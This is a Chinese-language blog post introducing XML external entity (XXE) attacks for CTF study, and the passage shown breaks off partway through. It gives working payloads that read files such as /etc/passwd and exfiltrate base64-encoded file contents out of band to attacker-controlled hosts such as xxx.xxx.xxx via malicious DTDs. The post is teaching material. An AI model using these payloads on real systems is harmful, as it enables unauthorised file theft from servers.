@@ -1,0 +1,342 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>初识XXE | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"Npc小站","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="Reference CTF XXE - MustaphaMond - 博客园 (cnblogs.com) XXE的基本概念和利用方式 - FreeBuf网络安全行业门户 XXE知识总结，有这篇就够了！-CSDN博客 XXE漏洞利用技巧：从XML到远程代码执行 - FreeBuf网络安全行业门户 XXE萌新进阶全攻略 - FreeBuf网络安全行业门户 绕过WAF保护的XXE - 先知社区 (al">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识XXE">
+<meta property="og:url" content="http://npc0vo.github.io/2024/07/03/%E5%88%9D%E8%AF%86XXE/index.html">
+<meta property="og:site_name" content="Npc | Blog">
+<meta property="og:description" content="Reference CTF XXE - MustaphaMond - 博客园 (cnblogs.com) XXE的基本概念和利用方式 - FreeBuf网络安全行业门户 XXE知识总结，有这篇就够了！-CSDN博客 XXE漏洞利用技巧：从XML到远程代码执行 - FreeBuf网络安全行业门户 XXE萌新进阶全攻略 - FreeBuf网络安全行业门户 绕过WAF保护的XXE - 先知社区 (al">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/03/%E5%88%9D%E8%AF%86XXE/image-20240703153711986.png">
+<meta property="og:image" content="http://npc0vo.github.io/2024/07/03/%E5%88%9D%E8%AF%86XXE/image-20240703153757216.png">
+<meta property="article:published_time" content="2024-07-03T14:39:37.000Z">
+<meta property="article:modified_time" content="2024-07-09T03:55:42.640Z">
+<meta property="article:author" content="Npc">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://npc0vo.github.io/2024/07/03/%E5%88%9D%E8%AF%86XXE/image-20240703153711986.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">😭</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">想s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">45</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">1.</span> <span class="toc-text"> Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text"> XML基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">2.1.</span> <span class="toc-text"> 内部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">2.2.</span> <span class="toc-text"> 参数实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">2.3.</span> <span class="toc-text"> 外部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">2.4.</span> <span class="toc-text"> 外部参数实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text"> XML外部实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.1.</span> <span class="toc-text"> 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#oob"><span class="toc-number">3.1.2.1.</span> <span class="toc-text"> oob</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99"><span class="toc-number">3.1.2.2.</span> <span class="toc-text"> 基于报错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">3.1.2.3.</span> <span class="toc-text"> 嵌套参数实体</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text"> 内网探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">3.3.</span> <span class="toc-text"> RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dos"><span class="toc-number">4.</span> <span class="toc-text"> DOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">5.</span> <span class="toc-text"> 绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#entitysystemfile%E7%AD%89%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text"> ENTITY&#96;&#96;SYSTEM&#96;&#96;file等关键词被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">5.2.</span> <span class="toc-text"> http被过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.1.</span> <span class="toc-text"> data:&#x2F;&#x2F;协议绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE%E5%8A%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.2.2.</span> <span class="toc-text"> file:&#x2F;&#x2F;协议加文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpfilter%E5%8D%8F%E8%AE%AE%E5%8A%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.2.3.</span> <span class="toc-text"> php:&#x2F;&#x2F;filter协议加文件上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">5.3.</span> <span class="toc-text"> 利用场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg"><span class="toc-number">6.</span> <span class="toc-text"> svg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#excel"><span class="toc-number">7.</span> <span class="toc-text"> excel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text"> 防御</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/07/03/%E5%88%9D%E8%AF%86XXE/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">初识XXE</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-07-03 22:39:37" itemprop="dateCreated datePublished" datetime="2024-07-03T22:39:37+08:00">2024-07-03</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-09 11:55:42" itemprop="dateModified" datetime="2024-07-09T11:55:42+08:00">2024-07-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">2.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">12m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/265324.html">XXE的基本概念和利用方式 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44420143/article/details/118721145">XXE知识总结，有这篇就够了！-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/194112.html">XXE萌新进阶全攻略 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059?time__1311=n4%2BxnD0DyGYQwqYTe05%2BbWeit1Abx0KqPx&amp;alichlgref=https%3A%2F%2Fwww.cnblogs.com%2F">绕过WAF保护的XXE - 先知社区 (aliyun.com)</a></p>
+<h2 id="xml基础"><a class="markdownIt-Anchor" href="#xml基础"></a> XML基础</h2>
+<p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p>
+<p>DTD一般认为有两种引用或声明方式：</p>
+<ul>
+<li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li>
+<li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li>
+</ul>
+<p>DTD实体有以下几种声明方式</p>
+<h3 id="内部实体"><a class="markdownIt-Anchor" href="#内部实体"></a> 内部实体</h3>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">a</span> <span class="token attr-name">"admin"</span><span class="token punctuation">></span></span>
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>&amp;a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- admin --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="参数实体"><a class="markdownIt-Anchor" href="#参数实体"></a> 参数实体</h3>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">></span></span> [
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">b</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">b1</span> <span class="token attr-name">"awsl"</span><span class="token punctuation">></span></span>">
+    %b;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>&amp;b1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- awsl --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li>
+<li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li>
+</ul>
+<h3 id="外部实体"><a class="markdownIt-Anchor" href="#外部实体"></a> 外部实体</h3>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">></span></span> [
+    &lt;!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>&amp;c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p>
+<img src="/2024/07/03/%E5%88%9D%E8%AF%86XXE/image-20240703153711986.png" class="" alt="image-20240703153711986" loading="lazy">
+<p>这是默认支持协议，还可以支持其他，php支持的拓展协议有</p>
+<img src="/2024/07/03/%E5%88%9D%E8%AF%86XXE/image-20240703153757216.png" class="" alt="image-20240703153757216" loading="lazy">
+<h3 id="外部参数实体"><a class="markdownIt-Anchor" href="#外部参数实体"></a> 外部参数实体</h3>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">></span></span> [
+    &lt;!ENTITY % d SYSTEM "http://47.106.143.26/xml.dtd">
+    %d;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>&amp;d1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- http://47.106.143.26/xml.dtd --></span>
+&lt;!ENTITY d1 SYSTEM "data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA=="><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="xml外部实体注入"><a class="markdownIt-Anchor" href="#xml外部实体注入"></a> XML外部实体注入</h2>
+<p>XML外部实体注入(XML External Entity)</p>
+<h3 id="任意文件读取"><a class="markdownIt-Anchor" href="#任意文件读取"></a> 任意文件读取</h3>
+<p>最简单也是最常用的利用方式<br />
+一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</p>
+<h4 id="有回显"><a class="markdownIt-Anchor" href="#有回显"></a> 有回显</h4>
+<p>恶意引入外部实体，直接读取靶机文件</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE foo [ 
+&lt;!ENTITY rabbit SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&rabbit;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>恶意引入外部参数实体</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY % file SYSTEM &quot;http:&#x2F;&#x2F;vps-ip&#x2F;hack.dtd&quot;&gt;
+    %file;
+]&gt;
+&lt;test&gt;&hhh;&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY hhh SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="无回显"><a class="markdownIt-Anchor" href="#无回显"></a> 无回显</h4>
+<h5 id="oob"><a class="markdownIt-Anchor" href="#oob"></a> oob</h5>
+<p>先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx">xxx.xxx.xxx</a>。</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE updateProfile [
+    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;target.php&quot;&gt;
+    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;evil.dtd&quot;&gt;
+    %dtd;
+    %send;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>evil.dtd的内容，内部的<code>%</code>号要进行实体编码成<code>&amp;#x25</code>。</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all
+    &quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;?data&#x3D;%file;&#39;&gt;&quot;
+&gt;
+%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
+<h5 id="基于报错"><a class="markdownIt-Anchor" href="#基于报错"></a> 基于报错</h5>
+<p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。<br />
+所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p>
+<p><strong>通过引入服务器文件</strong></p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;blog.szfszf.top&#x2F;xml.dtd&quot;&gt;
+	&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+	%remote;
+	%send;
+]&gt;
+&lt;message&gt;1234&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>xml.dtd</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!-- xml.dtd --&gt;
+&lt;!ENTITY % start &quot;&lt;!ENTITY &#x25; send SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;hhhhhhh&#x2F;%file;&#39;&gt;&quot;&gt;
+%start;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>通过引入本地文件</strong></p>
+<p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一些实体内容就行。</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+	&lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;
+	&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+	&lt;!ENTITY % ISOamso &#39;
+		&lt;!ENTITY &#x25; eval &quot;&lt;!ENTITY &#x26;#x25; send SYSTEM &#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&#x25;file;&#x27;&gt;&quot;&gt;
+		&#x25;eval;
+		&#x25;send;
+	&#39;&gt; 
+	%remote;
+]&gt;
+&lt;message&gt;1234&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们仔细看一下很好理解，第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send</p>
+<h5 id="嵌套参数实体"><a class="markdownIt-Anchor" href="#嵌套参数实体"></a> 嵌套参数实体</h5>
+<blockquote>
+<p>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的</p>
